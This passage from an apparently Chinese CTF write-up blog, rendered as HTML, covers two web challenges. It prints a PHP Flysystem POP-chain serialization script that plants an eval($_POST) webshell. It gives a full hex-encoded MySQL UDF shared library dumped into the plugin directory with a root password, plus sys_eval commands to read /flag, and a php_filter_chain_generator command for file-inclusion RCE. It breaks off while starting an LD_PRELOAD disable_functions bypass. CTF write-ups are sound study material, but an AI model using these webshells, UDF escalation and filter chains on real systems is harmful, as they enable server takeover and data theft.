invoke__">md5</span>(<span class="hljs-variable">$keya</span> . <span class="hljs-variable">$keyc</span>);<br>    <span class="hljs-variable">$key_length</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cryptkey</span>);<br>    <span class="hljs-comment">// 明文，前10位用来保存时间戳，解密时验证数据有效性，10到26位用来保存$keyb(密匙b)，解密时会通过这个密匙验证数据完整性</span><br>    <span class="hljs-comment">// 如果是解码的话，会从第$ckey_length位开始，因为密文前$ckey_length位保存 动态密匙，以保证解密正确</span><br>    <span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&#x27;%010d&#x27;</span>, <span class="hljs-variable">$expiry</span> ? <span class="hljs-variable">$expiry</span> + <span class="hljs-title function_ invoke__">time</span>() : <span class="hljs-number">0</span>) . <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$string</span> . <span class="hljs-variable">$keyb</span>), <span class="hljs-number">0</span>, <span class="hljs-number">16</span>) . <span class="hljs-variable">$string</span>;<br>    <span class="hljs-variable">$string_length</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$string</span>);<br>    <span class="hljs-variable">$result</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$box</span> = <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>);<br>    <span class="hljs-variable">$rndkey</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-comment">// 产生密匙簿</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt;= <span class="hljs-number">255</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$rndkey</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$cryptkey</span>[<span class="hljs-variable">$i</span> % <span class="hljs-variable">$key_length</span>]);<br>    &#125;<br>    <span class="hljs-comment">// 用固定的算法，打乱密匙簿，增加随机性，好像很复杂，实际上对并不会增加密文的强度</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span> = <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$j</span> = (<span class="hljs-variable">$j</span> + <span class="hljs-variable">$box</span>[<span class="hljs-variable">$i</span>] + <span class="hljs-variable">$rndkey</span>[<span class="hljs-variable">$i</span>]) % <span class="hljs-number">256</span>;<br>        <span class="hljs-variable">$tmp</span> = <span class="hljs-variable">$box</span>[<span class="hljs-variable">$i</span>];<br>        <span class="hljs-variable">$box</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$box</span>[<span class="hljs-variable">$j</span>];<br>        <span class="hljs-variable">$box</span>[<span class="hljs-variable">$j</span>] = <span class="hljs-variable">$tmp</span>;<br>    &#125;<br>    <span class="hljs-comment">// 核心加解密部分</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$a</span> = <span class="hljs-variable">$j</span> = <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$string_length</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$a</span> = (<span class="hljs-variable">$a</span> + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>        <span class="hljs-variable">$j</span> = (<span class="hljs-variable">$j</span> + <span class="hljs-variable">$box</span>[<span class="hljs-variable">$a</span>]) % <span class="hljs-number">256</span>;<br>        <span class="hljs-variable">$tmp</span> = <span class="hljs-variable">$box</span>[<span class="hljs-variable">$a</span>];<br>        <span class="hljs-variable">$box</span>[<span class="hljs-variable">$a</span>] = <span class="hljs-variable">$box</span>[<span class="hljs-variable">$j</span>];<br>        <span class="hljs-variable">$box</span>[<span class="hljs-variable">$j</span>] = <span class="hljs-variable">$tmp</span>;<br>        <span class="hljs-comment">// 从密匙簿得出密匙进行异或，再转成字符</span><br>        <span class="hljs-variable">$result</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$string</span>[<span class="hljs-variable">$i</span>]) ^ (<span class="hljs-variable">$box</span>[(<span class="hljs-variable">$box</span>[<span class="hljs-variable">$a</span>] + <span class="hljs-variable">$box</span>[<span class="hljs-variable">$j</span>]) % <span class="hljs-number">256</span>]));<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$keyc</span> . <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;=&#x27;</span>), <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>), <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$result</span>));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>有点小麻烦，我们可以直接搭建一个，然后调用这个函数即可：</p>
+<p>我们在首页弹出一个加密后的cookie：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151949833.png" srcset="/img/loading.gif" lazyload alt="image-20230815194941726"></p>
+<p>加密脚本如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">League</span>\<span class="hljs-title class_">Flysystem</span>\<span class="hljs-title class_">Cached</span>\<span class="hljs-title class_">Storage</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">League</span>\<span class="hljs-title class_">Flysystem</span>\<span class="hljs-title class_">Filesystem</span>;<br>    <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractCache</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$autosave</span> = <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Adapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractCache</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$adapter</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$file</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;complete = <span class="hljs-string">&quot;*/&lt;?php phpinfo();eval(\$_POST[1]);?&gt;&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;expire = <span class="hljs-string">&quot;yydsy4&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;adapter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">\League\Flysystem\Adapter\Local</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&quot;pop.php&quot;</span>;<br>        &#125;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">League</span>\<span class="hljs-title class_">Flysystem</span>\<span class="hljs-title class_">Adapter</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Local</span> <span class="hljs-title class_">extends</span> <span class="hljs-title class_">AbstractAdapter</span>&#123;<br><br>    &#125;<br>    <span class="hljs-title class_">abstract</span> <span class="hljs-title class_">class</span> <span class="hljs-title class_">AbstractAdapter</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">pathPrefix</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;pathPrefix = <span class="hljs-string">&quot;./&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> &#123;<br><br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">League</span>\<span class="hljs-title class_">Flysystem</span>\<span class="hljs-title class_">Cached</span>\<span class="hljs-title class_">Storage</span>\<span class="hljs-title class_">Adapter</span>;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Adapter</span>();<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>脚本在根目录写一个木马</p>
+<p>嫌麻烦我就不搞了，手动在根目录加pop.php</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308152043132.png" srcset="/img/loading.gif" lazyload alt="image-20230815204340034"></p>
+<p>蚁剑连接：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308152047640.png" srcset="/img/loading.gif" lazyload alt="image-20230815204721535"></p>
+<p>第二个flag是mysql用户的</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308152048936.png" srcset="/img/loading.gif" lazyload alt="image-20230815204812858"></p>
+<p>查看一下数据库信息：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308152049296.png" srcset="/img/loading.gif" lazyload alt="image-20230815204942207"></p>
+<p>发现了数据库root权限的账号密码，但是我们当前的用户只是<code>www-data</code>权限而已，想要读flag是不可能的，所以我们需要使用<code>UDF提权</code></p>
+<blockquote>
+<p>UDF（User-Defined Function）提权指的是<strong>通过在MySQL数据库中编写自定义函数（UDF）的方式，实现在MySQL数据库中提升权限的方法</strong></p>
+</blockquote>
+<p>我们只需要写一个plugin进去，但是不能直接写进去，因为plugin目录没权限写:</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308152134601.png" srcset="/img/loading.gif" lazyload alt="image-20230815213424531"></p>
+<p>但是由于当前我们有root权限的数据库用户，我们可以使用<code>select   into dumpfile</code>的形式写入：</p>
+<blockquote>
+<p>当以 root 用户身份执行 <code>SELECT INTO DUMPFILE</code> 查询时，它将绕过文件权限检查，并允许将查询结果写入任何有效的文件路径中，即使该路径对 mysql 用户是无法写入的。</p>
+<p>请注意，使用 root 用户执行此操作需要格外小心，因为它会绕过一些安全限制。确保仅允许可信任的用户以 root 权限执行此操作，并且仅指定安全的文件路径。</p>
+</blockquote>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">mysql -uroot -p456456zxc+123666 -e &quot;<span class="hljs-keyword">SELECT</span> <span class="hljs-number">0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000</span> <span class="hljs-keyword">INTO</span> DUMPFILE <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;&quot;<br></code></pre></td></tr></table></figure>
+
+<p>在<code>/tmp</code>目录创建一个<code>poc.sh</code>，然后修改权限执行它，这时就会将<code>udf.so</code>文件写入<code>/usr/lib/mysql/plugin/</code>目录了（本来是没有权限的）</p>
+<p>成功写入后就udf提权了：</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lisp">mysql -uroot -p456456zxc+123666 -e &#x27;create function sys_eval returns string soname <span class="hljs-string">&quot;udf.so&quot;</span><span class="hljs-comment">;&#x27;</span><br>mysql -uroot -p456456zxc+123666 -e &#x27;select sys_eval(<span class="hljs-string">&quot;chmod 777 /flag&quot;</span>)<span class="hljs-comment">;&#x27;</span><br>mysql -uroot -p456456zxc+123666 -e &#x27;select sys_eval(<span class="hljs-string">&quot;cat /flag&quot;</span>)<span class="hljs-comment">;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>md本地没用</p>
+<h5 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h5><p>要学学udf提权的知识</p>
+<h4 id="Ez-include"><a href="#Ez-include" class="headerlink" title="Ez_include"></a>Ez_include</h4><blockquote>
+<p>hint: 可以参考<a target="_blank" rel="noopener" href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p>
+</blockquote>
+<p>看题貌似是一个文件包含</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308161242838.png" srcset="/img/loading.gif" lazyload alt="image-20230816124204609"></p>
+<p>但是没法利用其他的，我们删掉后面的参数：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308161243577.png" srcset="/img/loading.gif" lazyload alt="image-20230816124304490"></p>
+<p>可以拿到源码，link参数后面会拼接一个<code>.txt</code>，这样一般的东西也利用不了</p>
+<p>然后这里面会有一个<code>LFI2RCE</code>的知识点，可以<strong>通过文件包含来RCE</strong>：<a target="_blank" rel="noopener" href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p>
+<p>可以在github上找到利用脚本：<a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">python3 php_filter_chain_generator.py --chain &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308161247792.png" srcset="/img/loading.gif" lazyload alt="image-20230816124728589"></p>
+<p>这样就成功了：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308161247889.png" srcset="/img/loading.gif" lazyload alt="image-20230816124710754"></p>
+<p>但是查看一下<code>disable_functions、disable_classes</code> 把很多的函数和类给禁用了,还限制了<code>open_basedir=/var/www/html:/tmp</code></p>
+<p>所以我们需要想办法 <code>php disable_function bypass</code></p>
+<p>这里有文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html#imagemagick-%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html#imagemagick-%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4623#toc-6">https://xz.aliyun.com/t/4623#toc-6</a></p>
+<h5 id="法一：劫持LD-PRELOAD绕过disable-functions"><a href="#法一：劫持LD-PRELOAD绕过disable-functions" class="headerlink" title="法一：劫持LD_PRELOAD绕过disable_functions"></a>法一：劫持LD_PRELOAD绕过disable_functions</h5><blockquote>
+<p>LD_PRELOAD指定的动态链接库文件，会在其它文件调用之前先被调用</p>
+<p>劫持步骤：</p>
+<ol>
+<li>生成一个我们的恶意动态链接库文件</li>
